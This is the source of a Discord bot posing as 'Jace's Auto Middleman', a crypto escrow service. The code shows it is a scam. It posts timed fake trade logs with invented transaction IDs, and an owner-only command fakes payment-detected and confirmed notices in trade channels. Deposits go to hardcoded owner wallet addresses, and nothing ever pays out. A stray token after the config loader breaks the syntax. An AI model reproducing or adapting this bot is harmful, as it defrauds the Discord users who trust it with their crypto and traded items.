require('dotenv').config();
const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType,
  PermissionsBitField,
  Events,
  SlashCommandBuilder,
  Routes,
  MessageFlags,
} = require('discord.js');

const db = require('./database');
const { REST } = require('@discordjs/rest');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
  ],
});

const OWNER_ID = process.env.OWNER_ID;
const DEFAULT_LTC = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const DEFAULT_USDC = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

let LTC_ADDRESS = DEFAULT_LTC;
let USDC_ADDRESS = DEFAULT_USDC;

const confirmedInteractions = new Set();
const activeTurns = new Map();
let logChannelId = null;
let panelCategoryId = null;

function loadConfig() {
  try {
    const logRow = db.prepare("SELECT value FROM config WHERE key='logChannel'").get();
    if (logRow) logChannelId = logRow.value;
    const catRow = db.prepare("SELECT value FROM config WHERE key='panelCategory'").get();
    if (catRow) panelCategoryId = catRow.value;
    const ltcRow = db.prepare("SELECT value FROM config WHERE key='ltcAddress'").get();
    if (ltcRow) LTC_ADDRESS = ltcRow.value;
    const usdcRow = db.prepare("SELECT value FROM config WHERE key='usdcAddress'").get();
    if (usdcRow) USDC_ADDRESS = usdcRow.value;
  } catch (e) {
    console.log('Config load error:', e.message);
  }
}byy

function generateFakeTxid() {
  const chars = '0123456789abcdef';
  let txid = '';
  for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * chars.length)];
  return txid;
}

function generateFakeAmount() {
  const usd = (Math.random() * 749 + 1).toFixed(2);
  const ltc = (usd / 55).toFixed(8);
  return { usd, ltc, txid: generateFakeTxid() };
}

async function sendFakeLog(channelId, withRelease = false) {
  const channel = await client.channels.fetch(channelId).catch(() => null);
  if (!channel) return;
  const { usd, ltc, txid } = generateFakeAmount();
  const txidShort = `${txid.substring(0, 10)}...${txid.substring(txid.length - 8)}`;
  const receiver = Math.random() > 0.8 ? '@SOPHIE' : 'Anonymous';
  
  if (withRelease) {
    const detectedEmbed = new EmbedBuilder()
      .setTitle('⚠️ Transaction Detected')
      .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.')
      .addFields(
        { name: 'Transaction', value: `[${txidShort}](https://live.blockcypher.com/ltc/tx/${txid})` },
        { name: 'Amount Received', value: `${ltc} LTC ($${usd})` }
      )
      .setColor(0xFFD700);
    await channel.send({ embeds: [detectedEmbed] });
    
    setTimeout(async () => {
      const confirmEmbed = new EmbedBuilder()
        .setTitle('✅ Transaction Confirmed!')
        .setDescription('The payment has been confirmed and secured in escrow.')
        .addFields(
          { name: 'Transaction', value: `[${txidShort}](https://live.blockcypher.com/ltc/tx/${txid})` },
          { name: 'Total Amount Received', value: `${ltc} LTC ($${usd})` }
        )
        .setColor(0x00FF00);
      const proceedEmbed = new EmbedBuilder()
        .setTitle('✅ You may proceed with your trade.')
        .setDescription('1. Receiver gives items\n2. Sender clicks Release')
        .setColor(0x00FF00);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('release').setLabel('Release').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
      );
      await channel.send({ embeds: [confirmEmbed, proceedEmbed], components: [row] });
    }, 15000);
  } else {
    const embed = new EmbedBuilder()
      .setTitle('• Trade Completed')
      .setDescription(`${ltc} LTC ($${usd} USD)`)
      .addFields(
        { name: 'Sender', value: 'Anonymous', inline: false },
        { name: 'Receiver', value: receiver, inline: false },
        { name: 'Transaction ID', value: `[${txidShort}](https://live.blockcypher.com/ltc/tx/${txid})`, inline: false }
      )
      .setColor(0x5865F2)
      .setTimestamp();
    await channel.send({ embeds: [embed] });
  }
}

setInterval(() => {
  if (!logChannelId) return;
  setTimeout(() => sendFakeLog(logChannelId), Math.random() * 120000 + 120000);
}, 60000);

const commands = [
  new SlashCommandBuilder().setName('panel').setDescription('Spawn the middleman panel'),
  new SlashCommandBuilder().setName('logchannel').setDescription('Set fake transaction log channel').addStringOption(opt => opt.setName('id').setDescription('Channel ID').setRequired(true)),
  new SlashCommandBuilder().setName('panelcategory').setDescription('Set ticket category').addStringOption(opt => opt.setName('id').setDescription('Category ID').setRequired(true)),
  new SlashCommandBuilder().setName('close').setDescription('Close this ticket')
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

client.once(Events.ClientReady, async () => {
  console.log(`Logged in as ${client.user.tag}`);
  loadConfig();
  try {
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('Commands deployed');
  } catch (err) {
    console.error('Command deploy error:', err.message);
  }
});

client.on(Events.MessageCreate, async (message) => {
  if (message.author.bot) return;
  if (message.author.id !== OWNER_ID) return;
  if (!message.content.startsWith('.')) return;
  
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift().toLowerCase();
  
  if (command === 'detect') {
    const channelId = args[0];
    if (!channelId) return message.reply('❌ Provide channel ID: `.detect (channelid)`');
    await sendFakeLog(channelId, true);
    await message.reply(`✅ Fake transaction + release triggered in <#${channelId}>`);
  }
  else if (command === 'setltc') {
    const address = args[0];
    if (!address) return message.reply('❌ Provide address: `.setltc (address)`');
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('ltcAddress', ?)").run(address);
    LTC_ADDRESS = address;
    await message.reply('✅ LTC address updated for all tickets');
  }
  else if (command === 'setusdc') {
    const address = args[0];
    if (!address) return message.reply('❌ Provide address: `.setusdc (address)`');
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('usdcAddress', ?)").run(address);
    USDC_ADDRESS = address;
    await message.reply('✅ USDC address updated for all tickets');
  }
});

client.on(Events.InteractionCreate, async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) {
      await handleSlashCommand(interaction);
    } else if (interaction.isButton()) {
      await handleButton(interaction);
    } else if (interaction.isModalSubmit()) {
      await handleModal(interaction);
    }
  } catch (err) {
    console.error('Interaction error:', err);
    try {
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({ content: `❌ Error: ${err.message}`, flags: MessageFlags.Ephemeral });
      }
    } catch {}
  }
});

async function handleSlashCommand(interaction) {
  const { commandName } = interaction;
  
  if (commandName === 'panel') {
    const mainEmbed = new EmbedBuilder()
      .setTitle("Jace's Auto Middleman")
      .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
      .setColor(0x2B2D31);
    
    const tutorialRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://example.com').setEmoji('🔗')
    );
    
    const feesEmbed = new EmbedBuilder()
      .setTitle('Fees:')
      .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
      .setColor(0x2B2D31);
    
    const ltcEmbed = new EmbedBuilder()
      .setTitle('• Request Litecoin •')
      .setColor(0x2B2D31);
    
    const ltcRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('🪙')
    );
    
    const usdtEmbed = new EmbedBuilder()
      .setTitle('• Request USDT [BEP-20] •')
      .setDescription('• Network: **BSC (BEP-20)**')
      .setColor(0x2B2D31);
    
    const usdtRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('request_usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji('💵')
    );
    
    await interaction.reply({ embeds: [mainEmbed, feesEmbed, ltcEmbed], components: [tutorialRow, ltcRow] });
    await interaction.channel.send({ embeds: [usdtEmbed], components: [usdtRow] });
  }
  else if (commandName === 'logchannel') {
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
    const id = interaction.options.getString('id');
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('logChannel', ?)").run(id);
    logChannelId = id;
    await interaction.reply({ content: '✅ Log channel set', flags: MessageFlags.Ephemeral });
  }
  else if (commandName === 'panelcategory') {
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
    const id = interaction.options.getString('id');
    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('panelCategory', ?)").run(id);
    panelCategoryId = id;
    await interaction.reply({ content: '✅ Panel category set', flags: MessageFlags.Ephemeral });
  }
  else if (commandName === 'close') {
    await interaction.channel.delete().catch(() => {});
  }
}

function calculateFee(amount) {
  if (amount < 50) return 0;
  if (amount >= 250) return 1.50;
  return 0.50;
}

async function handleButton(interaction) {
  const customId = interaction.customId;
  
  if (customId === 'request_ltc' || customId === 'request_usdt') {
    const isLtc = customId === 'request_ltc';
    const modal = new ModalBuilder()
      .setCustomId(isLtc ? 'ltc_modal' : 'usdt_modal')
      .setTitle('Fill out the format');
    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('otherUserId').setLabel("Paste Your Trader's Username or ID").setPlaceholder('e.g.: kookie.js / 693059117761429610').setStyle(TextInputStyle.Short).setRequired(true)
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('youGiving').setLabel('What are You giving?').setStyle(TextInputStyle.Short).setRequired(true)
      ),
      new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('theyGiving').setLabel('What is Your Trader giving?').setStyle(TextInputStyle.Short).setRequired(true)
      )
    );
    await interaction.showModal(modal);
  }
  else if (customId.startsWith('role_')) {
    await handleRoleSelection(interaction);
  }
  else if (customId.startsWith('confirm_info_')) {
    await handleConfirmInfo(interaction);
  }
  else if (customId.startsWith('set_amount_')) {
    await handleSetAmount(interaction);
  }
  else if (customId.startsWith('confirm_amount_')) {
    await handleConfirmAmount(interaction);
  }
  else if (customId.startsWith('release_')) {
    await handleRelease(interaction);
  }
  else if (customId.startsWith('confirm_release_')) {
    await handleConfirmRelease(interaction);
  }
  else if (customId.startsWith('enter_address_')) {
    await handleEnterAddress(interaction);
  }
  else if (customId.startsWith('copy_details_')) {
    const tradeId = customId.split('_')[2];
    const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
    if (!trade) return;
    const address = trade.type === 'ltc' ? LTC_ADDRESS : USDC_ADDRESS;
    await interaction.reply({ content: `\`${address}\``, flags: MessageFlags.Ephemeral });
  }
  else if (customId === 'cancel' || customId === 'close_ticket' || customId.startsWith('delete_') || customId.startsWith('cancel_trade_')) {
    await interaction.channel.delete().catch(() => {});
  }
}

async function handleModal(interaction) {
  if (interaction.customId === 'ltc_modal' || interaction.customId === 'usdt_modal') {
    await handleTradeDetailsModal(interaction);
  }
  else if (interaction.customId.startsWith('amount_modal_')) {
    await handleAmountModal(interaction);
  }
  else if (interaction.customId.startsWith('address_modal_')) {
    await handleAddressModal(interaction);
  }
}

async function handleTradeDetailsModal(interaction) {
  try {
    const isLtc = interaction.customId === 'ltc_modal';
    const rawInput = interaction.fields.getTextInputValue('otherUserId').trim();
    const youGiving = interaction.fields.getTextInputValue('youGiving');
    const theyGiving = interaction.fields.getTextInputValue('theyGiving');
    
    let otherUserId = rawInput.replace(/[<@!>]/g, '');
    
    if (!/^\d{17,19}$/.test(otherUserId)) {
      try {
        const members = await interaction.guild.members.fetch({ query: rawInput, limit: 1 });
        if (members.size > 0) {
          otherUserId = members.first().id;
        }
      } catch (e) {
        console.log('Username lookup failed:', e.message);
      }
    }
    
    if (!/^\d{17,19}$/.test(otherUserId)) {
      return interaction.reply({ content: `❌ Invalid user format: "${rawInput}". Use ID or username.`, flags: MessageFlags.Ephemeral });
    }
    
    let otherMember;
    try {
      otherMember = await interaction.guild.members.fetch(otherUserId);
    } catch (err) {
      return interaction.reply({ content: `❌ User not found in server: "${rawInput}"`, flags: MessageFlags.Ephemeral });
    }
    
    if (otherUserId === interaction.user.id) {
      return interaction.reply({ content: '❌ You cannot trade with yourself.', flags: MessageFlags.Ephemeral });
    }
    
    const channelOptions = {
      name: `${isLtc ? 'ltc' : 'usdc'}-${interaction.user.username}-${otherMember.user.username}`.substring(0, 100),
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
        { id: otherUserId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    };
    
    if (panelCategoryId) {
      const category = await interaction.guild.channels.fetch(panelCategoryId).catch(() => null);
      if (category) channelOptions.parent = panelCategoryId;
    }
    
    const channel = await interaction.guild.channels.create(channelOptions);
    
    const result = db.prepare('INSERT INTO trades (channelId, user1Id, user2Id, senderId, receiverId, amount, status, type) VALUES (?, ?, ?, NULL, NULL, 0, "role_selection", ?)').run(channel.id, interaction.user.id, otherUserId, isLtc ? 'ltc' : 'usdc');
    const tradeId = result.lastInsertRowid;
    
    await interaction.reply({ content: `✅ Trade channel created: ${channel}`, flags: MessageFlags.Ephemeral });
    
    const embed = new EmbedBuilder()
      .setTitle("👋 Jace's Auto Middleman Service")
      .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.')
      .addFields(
        { name: `${interaction.user.username}'s side:`, value: youGiving, inline: true },
        { name: `${otherMember.user.username}'s side:`, value: theyGiving, inline: true }
      )
      .setColor(0x5865F2);
    
    const deleteRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`delete_${tradeId}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
    );
    
    await channel.send({ content: `${interaction.user} ${otherMember}`, embeds: [embed], components: [deleteRow] });
    
    const roleEmbed = new EmbedBuilder()
      .setDescription('**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.')
      .setColor(0x5865F2);
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`role_sender_${tradeId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`role_receiver_${tradeId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`role_reset_${tradeId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
    );
    
    await channel.send({ embeds: [roleEmbed], components: [roleRow] });
    
  } catch (err) {
    console.error('Create ticket error:', err);
    await interaction.reply({ content: `❌ Error creating ticket: ${err.message}`, flags: MessageFlags.Ephemeral });
  }
}

async function handleRoleSelection(interaction) {
  const [_, action, tradeId] = interaction.customId.split('_');
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade) return interaction.reply({ content: 'Trade not found.', flags: MessageFlags.Ephemeral });
  
  const userId = interaction.user.id;
  
  if (action === 'reset') {
    db.prepare('UPDATE trades SET senderId = NULL, receiverId = NULL WHERE id = ?').run(tradeId);
    activeTurns.delete(tradeId);
    await updateRoleDisplay(interaction, tradeId);
    return interaction.reply({ content: '✅ Roles reset.', flags: MessageFlags.Ephemeral });
  }
  
  const isSender = action === 'sender';
  
  if (userId !== trade.user1Id && userId !== trade.user2Id) {
    return interaction.reply({ content: '❌ You are not part of this trade.', flags: MessageFlags.Ephemeral });
  }
  if ((isSender && trade.receiverId === userId) || (!isSender && trade.senderId === userId)) {
    return interaction.reply({ content: '❌ You cannot be both Sender and Receiver!', flags: MessageFlags.Ephemeral });
  }
  
  db.prepare(`UPDATE trades SET ${isSender ? 'senderId' : 'receiverId'} = ? WHERE id = ?`).run(userId, tradeId);
  await interaction.reply({ content: `✅ You are now the ${isSender ? 'Sender' : 'Receiver'}!`, flags: MessageFlags.Ephemeral });
  
  await updateRoleDisplay(interaction, tradeId);
  
  const updated = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (updated.senderId && updated.receiverId) {
    await sendInfoConfirmation(interaction.channel, tradeId);
  }
}

async function updateRoleDisplay(interaction, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  let description = '**Select your role**\n• **"Sender"** if you are **Sending** crypto to the bot.\n• **"Receiver"** if you are **Receiving** crypto from the bot.\n\n';
  
  if (trade.senderId) {
    const sender = await client.users.fetch(trade.senderId).catch(() => null);
    description += `**Sender:** ${sender ? sender.toString() : 'Unknown'}\n`;
  }
  if (trade.receiverId) {
    const receiver = await client.users.fetch(trade.receiverId).catch(() => null);
    description += `**Receiver:** ${receiver ? receiver.toString() : 'Unknown'}\n`;
  }
  
  const messages = await interaction.channel.messages.fetch({ limit: 10 });
  const roleMsg = messages.find(m => m.embeds[0]?.description?.includes('Select your role'));
  if (roleMsg) {
    await roleMsg.edit({
      embeds: [new EmbedBuilder().setDescription(description).setColor(0x5865F2)],
      components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`role_sender_${tradeId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`role_receiver_${tradeId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`role_reset_${tradeId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
      )]
    });
  }
}

async function sendInfoConfirmation(channel, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const sender = await client.users.fetch(trade.senderId).catch(() => null);
  const receiver = await client.users.fetch(trade.receiverId).catch(() => null);
  
  const embed = new EmbedBuilder()
    .setTitle('• Is This Information Correct?')
    .addFields(
      { name: 'Sender', value: sender ? sender.toString() : 'Unknown', inline: false },
      { name: 'Receiver', value: receiver ? receiver.toString() : 'Unknown', inline: false }
    )
    .setDescription('Make sure you have selected the right role! If you didn\'t then click "Incorrect"')
    .setColor(0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_info_${tradeId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_info_${tradeId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await channel.send({ embeds: [embed], components: [row] });
}

async function handleConfirmInfo(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade || (interaction.user.id !== trade.user1Id && interaction.user.id !== trade.user2Id)) return;
  
  const key = `info_${tradeId}_${interaction.user.id}`;
  if (confirmedInteractions.has(key)) return interaction.reply({ content: '✅ Already confirmed!', flags: MessageFlags.Ephemeral });
  confirmedInteractions.add(key);
  
  await interaction.reply({ content: `✅ ${interaction.user.toString()} clicked Correct.`, ephemeral: false });
  
  const otherUserId = interaction.user.id === trade.user1Id ? trade.user2Id : trade.user1Id;
  if (confirmedInteractions.has(`info_${tradeId}_${otherUserId}`)) {
    await promptForAmount(interaction.channel, tradeId);
  }
}

async function promptForAmount(channel, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade?.senderId) return;
  
  activeTurns.set(tradeId, { type: 'sender', userId: trade.senderId });
  
  const embed = new EmbedBuilder()
    .setDescription('💵 **Set the amount in USD value**\n\nOnly the sender can click this button.')
    .setColor(0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`set_amount_${tradeId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
  );
  
  await channel.send({ content: `<@${trade.senderId}>`, embeds: [embed], components: [row] });
}

async function handleSetAmount(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const turn = activeTurns.get(tradeId);
  
  if (!turn || turn.type !== 'sender' || turn.userId !== interaction.user.id) {
    return interaction.reply({ content: '❌ It is not your turn!', flags: MessageFlags.Ephemeral });
  }
  
  const modal = new ModalBuilder()
    .setCustomId(`amount_modal_${tradeId}`)
    .setTitle('Set USD Amount');
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('usd_amount').setLabel('USD Amount').setPlaceholder('30').setStyle(TextInputStyle.Short).setRequired(true)
    )
  );
  
  await interaction.showModal(modal);
}

async function handleAmountModal(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const amount = parseFloat(interaction.fields.getTextInputValue('usd_amount'));
  
  if (isNaN(amount) || amount <= 0) {
    return interaction.reply({ content: '❌ Invalid amount.', flags: MessageFlags.Ephemeral });
  }
  
  const turn = activeTurns.get(tradeId);
  if (!turn || turn.type !== 'sender' || turn.userId !== interaction.user.id) {
    return interaction.reply({ content: '❌ Not your turn!', flags: MessageFlags.Ephemeral });
  }
  
  const fee = calculateFee(amount);
  const totalUsd = amount + fee;
  const totalLtc = totalUsd / 55;
  
  db.prepare('UPDATE trades SET amount = ?, fee = ?, ltcPrice = 55, totalLtc = ?, status = "amount_set" WHERE id = ?')
    .run(amount, fee, totalLtc, tradeId);
  
  activeTurns.delete(tradeId);
  
  const embed = new EmbedBuilder()
    .setDescription(`**USD amount set to $${amount.toFixed(2)}**\nFee: $${fee.toFixed(2)}\nTotal: $${totalUsd.toFixed(2)}\n\nPlease confirm the USD amount.`)
    .setColor(0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${tradeId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${tradeId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await interaction.reply({ embeds: [embed], components: [row] });
}

async function handleConfirmAmount(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (!trade || (interaction.user.id !== trade.user1Id && interaction.user.id !== trade.user2Id)) return;
  
  const key = `amount_${tradeId}_${interaction.user.id}`;
  if (confirmedInteractions.has(key)) return;
  confirmedInteractions.add(key);
  
  await interaction.reply({ content: `✅ ${interaction.user.toString()} confirmed the USD amount.`, ephemeral: false });
  
  const otherUserId = interaction.user.id === trade.user1Id ? trade.user2Id : trade.user1Id;
  if (confirmedInteractions.has(`amount_${tradeId}_${otherUserId}`)) {
    await sendPaymentInstructions(interaction.channel, tradeId);
  }
}

async function sendPaymentInstructions(channel, tradeId) {
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const isLtc = trade.type === 'ltc';
  const address = isLtc ? LTC_ADDRESS : USDC_ADDRESS;
  const fee = trade.fee || 0;
  const totalUsd = trade.amount + fee;
  
  const embed = new EmbedBuilder()
    .setDescription(`<@${trade.senderId}> Send the ${isLtc ? 'LTC' : 'USDT'} to the following address.`)
    .addFields(
      { name: '📋 Payment Information', value: 'Make sure to send the **EXACT** amount.' },
      { name: 'USD Amount', value: `$${trade.amount.toFixed(2)}` },
      { name: 'Fee', value: `$${fee.toFixed(2)}` },
      { name: 'Total with Fee', value: `$${totalUsd.toFixed(2)}` },
      { name: isLtc ? 'LTC Amount' : 'USDT Amount', value: trade.totalLtc.toFixed(5) },
      { name: 'Payment Address', value: `\`${address}\`` },
      { name: 'Current LTC Price', value: '$55.00' },
      { name: '⏰ Timeout', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
    )
    .setColor(0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`copy_details_${tradeId}`).setLabel('Copy Details').setStyle(ButtonStyle.Primary)
  );
  
  await channel.send({ embeds: [embed], components: [row] });
  db.prepare('UPDATE trades SET status = "awaiting_payment" WHERE id = ?').run(tradeId);
}

async function handleRelease(interaction) {
  const tradeId = interaction.customId.split('_')[1];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (interaction.user.id !== trade.senderId) {
    return interaction.reply({ content: '❌ Only the sender can release funds!', flags: MessageFlags.Ephemeral });
  }
  
  const embed = new EmbedBuilder()
    .setTitle('⚠️ Are you sure you want to release the crypto?')
    .setDescription('Clicking **"Confirm"** will give your trader permission to withdraw.')
    .setColor(0xFFD700);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_release_${tradeId}`).setLabel('Confirm').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`back_release_${tradeId}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
  );
  
  await interaction.reply({ embeds: [embed], components: [row], ephemeral: false });
}

async function handleConfirmRelease(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  if (interaction.user.id !== trade.senderId && interaction.user.id !== OWNER_ID) {
    return interaction.reply({ content: '❌ Only the sender can confirm release!', flags: MessageFlags.Ephemeral });
  }
  
  activeTurns.set(tradeId, { type: 'receiver', userId: trade.receiverId });
  
  const embed = new EmbedBuilder()
    .setDescription('💰 **What\'s Your Address?**\n\nOnly the receiver can click this button to enter their address.')
    .setColor(0x5865F2);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`enter_address_${tradeId}`).setLabel('Enter Your Address').setStyle(ButtonStyle.Primary)
  );
  
  await interaction.update({ content: `<@${trade.receiverId}>`, embeds: [embed], components: [row] });
}

async function handleEnterAddress(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const trade = db.prepare('SELECT * FROM trades WHERE id = ?').get(tradeId);
  const turn = activeTurns.get(tradeId);
  
  if (!turn || turn.type !== 'receiver' || turn.userId !== interaction.user.id) {
    return interaction.reply({ content: '❌ Not your turn!', flags: MessageFlags.Ephemeral });
  }
  
  const isLtc = trade.type === 'ltc';
  const modal = new ModalBuilder()
    .setCustomId(`address_modal_${tradeId}`)
    .setTitle('Enter Your Address');
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId('address')
        .setLabel('Address')
        .setPlaceholder(isLtc ? LTC_ADDRESS : USDC_ADDRESS)
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
    )
  );
  
  await interaction.showModal(modal);
}

async function handleAddressModal(interaction) {
  const tradeId = interaction.customId.split('_')[2];
  const address = interaction.fields.getTextInputValue('address').trim();
  
  const embed = new EmbedBuilder()
    .setTitle('⚠️ Confirm Address')
    .setDescription(`**Address:**\n\`${address}\`\n\nClick **"Confirm"** to proceed.`)
    .setColor(0xFFD700);
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`final_confirm_${tradeId}_${address}`).setLabel('Confirm').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`back_${tradeId}`).setLabel('Back').setStyle(ButtonStyle.Secondary)
  );
  
  await interaction.reply({ embeds: [embed], components: [row] });
}

client.login(process.env.DISCORD_TOKEN);
